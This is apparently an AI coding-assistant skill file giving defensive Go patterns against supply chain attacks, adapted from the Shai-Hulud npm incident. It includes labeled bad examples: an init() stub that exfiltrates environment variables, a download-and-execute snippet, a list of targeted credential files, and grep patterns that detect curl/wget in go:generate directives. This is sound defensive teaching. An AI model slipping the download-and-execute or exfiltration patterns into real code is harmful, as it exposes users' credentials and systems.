---
name: supply-chain-secure-code
description: Use when writing Go code that interacts with dependencies, handles credentials, executes commands, or manages configuration. Provides supply chain attack countermeasures at the code level including safe dependency usage, credential handling, subprocess hardening, and runtime integrity patterns. Adapted from Shai-Hulud npm attack lessons.
allowed-tools: Read, Write, Edit, Bash, Grep, Glob
user-invocable: true
---

# Supply Chain Secure Code (Go)

This skill provides Go coding patterns that defend against supply chain attacks at the application code level. While Go's module system is inherently more secure than npm (no lifecycle scripts, mandatory checksums), malicious code within imported packages still executes at runtime.

## When to Apply

Apply these guidelines when:
- Importing and using third-party packages
- Handling credentials, tokens, or API keys in code
- Executing external commands (`os/exec`)
- Loading configuration from files or environment variables
- Reviewing code for supply chain attack vectors

## Threat Model: Go-Specific Attack Vectors

| Attack Vector | Description | Defense |
|---------------|-------------|---------|
| Malicious import | Compromised package executes malicious code when imported | Minimize dependencies, review imports |
| `init()` functions | Execute automatically on import, before `main()` | Audit `init()` in dependencies |
| `go:generate` directives | Execute arbitrary commands | Never run `go generate` on untrusted code |
| cgo | Links native C code, bypasses Go safety | Avoid cgo when possible (`CGO_ENABLED=0`) |
| `os/exec` in dependencies | Dependencies may spawn processes | Audit dependency code paths |
| `unsafe` package | Bypasses Go type safety | Flag `unsafe` usage in dependencies |
| Build constraints | Platform-specific code may hide malicious logic | Review all build tags |

**NOTE**: Go has no lifecycle scripts. `go get` and `go build` do NOT execute arbitrary code (unlike `npm install`). The risk is at **runtime** when your application imports and calls dependency code.

## Credential Handling

### Never Hardcode Credentials

```go
// BAD
const apiKey = "ghp_xxxxxxxxxxxxxxxxxxxx"

// BAD - embedded in struct
var config = Config{
    Token: "sk-xxxxxxxxxxxxxxxxxxxx",
}

// GOOD - environment variable
apiKey := os.Getenv("API_KEY")
if apiKey == "" {
    log.Fatal("API_KEY environment variable is required")
}
```

### Credential Validation at Startup

```go
// Validate all required credentials at startup
type Config struct {
    APIKey      string `env:"API_KEY" required:"true"`
    DatabaseURL string `env:"DATABASE_URL" required:"true"`
}

func LoadConfig() (*Config, error) {
    cfg := &Config{
        APIKey:      os.Getenv("API_KEY"),
        DatabaseURL: os.Getenv("DATABASE_URL"),
    }
    if cfg.APIKey == "" {
        return nil, fmt.Errorf("API_KEY is required")
    }
    if cfg.DatabaseURL == "" {
        return nil, fmt.Errorf("DATABASE_URL is required")
    }
    return cfg, nil
}
```

### Credential Isolation in Subprocesses

```go
// BAD - passes ALL environment variables including tokens
cmd := exec.Command("some-tool", "--flag")
// cmd.Env defaults to os.Environ() - includes everything

// GOOD - pass only needed environment variables
cmd := exec.Command("some-tool", "--flag")
cmd.Env = []string{
    "PATH=" + os.Getenv("PATH"),
    "HOME=" + os.Getenv("HOME"),
    // Explicitly DO NOT pass:
    // GITHUB_TOKEN, AWS_ACCESS_KEY_ID, etc.
}
```

## Safe Dependency Usage

### init() Function Awareness

Go's `init()` functions execute automatically when a package is imported -- this is the closest equivalent to npm's lifecycle scripts:

```go
// In a compromised dependency:
func init() {
    // This runs automatically when your code imports this package
    // No explicit call needed
    go exfiltrate(os.Environ())
}
```

**Defense**: Audit `init()` functions in new dependencies:

```bash
# Find all init() functions in dependencies
grep -r "func init()" $(go env GOMODCACHE) 2>/dev/null | head -50
```

### Minimize Import Surface

```go
// BAD - importing a large package for one function
import "github.com/large-framework/everything"

// GOOD - import only the specific sub-package
import "github.com/large-framework/strings"

// BEST - use standard library when possible
import "strings"  // Go stdlib is reviewed and trusted
```

### Avoid Unsafe and Reflect

```go
// Flag these imports in dependencies:
import "unsafe"      // Bypasses Go type safety
import "reflect"     // Can access unexported fields
import "plugin"      // Loads arbitrary shared libraries at runtime

// In your code: avoid unless absolutely necessary
```

## Subprocess Security

### Validated Command Execution

```go
// BAD - shell injection via string interpolation
cmd := exec.Command("sh", "-c", fmt.Sprintf("echo %s", userInput))

// GOOD - use argument list (no shell interpretation)
cmd := exec.Command("echo", userInput)

// GOOD - if shell is needed, validate input strictly
if !regexp.MustCompile(`^[a-zA-Z0-9_-]+$`).MatchString(userInput) {
    return fmt.Errorf("invalid input: %q", userInput)
}
cmd := exec.Command("tool", "--name", userInput)
```

### Environment Isolation

```go
// CRITICAL: When spawning processes, control the environment
func safeExec(name string, args ...string) *exec.Cmd {
    cmd := exec.Command(name, args...)
    cmd.Env = []string{
        "PATH=/usr/bin:/bin",
        "HOME=" + os.Getenv("HOME"),
        "LANG=en_US.UTF-8",
    }
    return cmd
}
```

### Never Download and Execute

```go
// DANGEROUS - this is exactly what Shai-Hulud does (adapted to Go)
// BAD
resp, _ := http.Get("https://example.com/binary")
os.WriteFile("/tmp/tool", body, 0755)
exec.Command("/tmp/tool").Run()

// GOOD - if downloading tools, verify checksum
func verifiedDownload(url, expectedSHA256 string) ([]byte, error) {
    resp, err := http.Get(url)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    data, err := io.ReadAll(resp.Body)
    if err != nil {
        return nil, err
    }

    hash := sha256.Sum256(data)
    actual := hex.EncodeToString(hash[:])
    if actual != expectedSHA256 {
        return nil, fmt.Errorf("integrity check failed: expected %s, got %s",
            expectedSHA256, actual)
    }
    return data, nil
}
```

## File Access Security

### Credential File Protection

```go
// Shai-Hulud (adapted) would target these files:
// ~/.config/gcloud/application_default_credentials.json
// ~/.aws/credentials
// ~/.azure/
// ~/.npmrc (even in Go projects, for CI environments)

// If your code reads files, validate paths strictly
func safePath(base, userPath string) (string, error) {
    resolved := filepath.Join(base, userPath)
    cleaned := filepath.Clean(resolved)

    // Prevent path traversal
    if !strings.HasPrefix(cleaned, filepath.Clean(base)+string(os.PathSeparator)) {
        return "", fmt.Errorf("path traversal detected: %s", userPath)
    }
    return cleaned, nil
}
```

## Network Security

### Outbound Request Validation

```go
var allowedHosts = map[string]bool{
    "api.example.com": true,
}

func validateURL(rawURL string) (*url.URL, error) {
    u, err := url.Parse(rawURL)
    if err != nil {
        return nil, err
    }

    if !allowedHosts[u.Hostname()] {
        return nil, fmt.Errorf("blocked request to unauthorized host: %s", u.Hostname())
    }

    // Block cloud metadata endpoints
    blocked := []string{"169.254.169.254", "metadata.google.internal"}
    for _, host := range blocked {
        if u.Hostname() == host {
            return nil, fmt.Errorf("blocked request to metadata endpoint: %s", host)
        }
    }

    return u, nil
}
```

## Build Security

### Disable cgo When Not Needed

```bash
# Build without cgo (prevents native code execution from dependencies)
CGO_ENABLED=0 go build ./...

# In CI:
- name: Build
  env:
    CGO_ENABLED: "0"
  run: go build ./...
```

### Reproducible Builds

```bash
# Build with trimpath for reproducible output
go build -trimpath -ldflags="-s -w" ./...
```

## Code Review Checklist

### High Priority

- [ ] No hardcoded credentials, tokens, or API keys
- [ ] No `os/exec` with unsanitized user input
- [ ] Subprocess calls do NOT inherit full `os.Environ()`
- [ ] No download-and-execute patterns
- [ ] No reading of credential files without explicit need
- [ ] No `go:generate` directives pointing to external URLs

### Medium Priority

- [ ] External HTTP requests validate response bodies
- [ ] File paths validated against path traversal
- [ ] Environment variables validated at startup
- [ ] Import surface minimized (stdlib preferred)
- [ ] `CGO_ENABLED=0` when cgo is not needed

### Low Priority (Defense in Depth)

- [ ] Outbound network requests limited to known hosts
- [ ] `init()` functions in dependencies audited
- [ ] `unsafe` package usage flagged in dependencies
- [ ] Build uses `-trimpath` for reproducibility

## Post-Compromise Detection

```bash
# Check for unexpected go:generate directives
grep -r "//go:generate" $(go env GOMODCACHE) 2>/dev/null | \
  grep -E "(curl|wget|bash|sh |http)" | head -20

# Verify module integrity
go mod verify

# Check for suspicious init() functions in dependencies
grep -r "func init()" $(go env GOMODCACHE) 2>/dev/null | \
  grep -v "_test.go" | head -50

# Check for os/exec usage in dependencies
grep -r "os/exec" $(go env GOMODCACHE) 2>/dev/null | \
  grep -v "_test.go" | head -50

# Check for network connections in dependencies
grep -r "net/http\|net.Dial" $(go env GOMODCACHE) 2>/dev/null | \
  grep -v "_test.go" | head -50

# Check for unauthorized GitHub runners and workflows
gh api repos/{owner}/{repo}/actions/runners --jq '.runners[] | {name, status}'
find .github/workflows -name "*.yml" -newer go.mod
```

## References

- [Go Module Security - Authenticating Modules](https://go.dev/ref/mod#authenticating)
- [govulncheck](https://pkg.go.dev/golang.org/x/vuln/cmd/govulncheck)
- [Go Security Best Practices](https://go.dev/doc/security/best-practices)
- [Shai-Hulud 2.0 - Lessons for All Ecosystems](https://www.trendmicro.com/en_us/research/25/k/shai-hulud-2-0-targets-cloud-and-developer-systems.html)
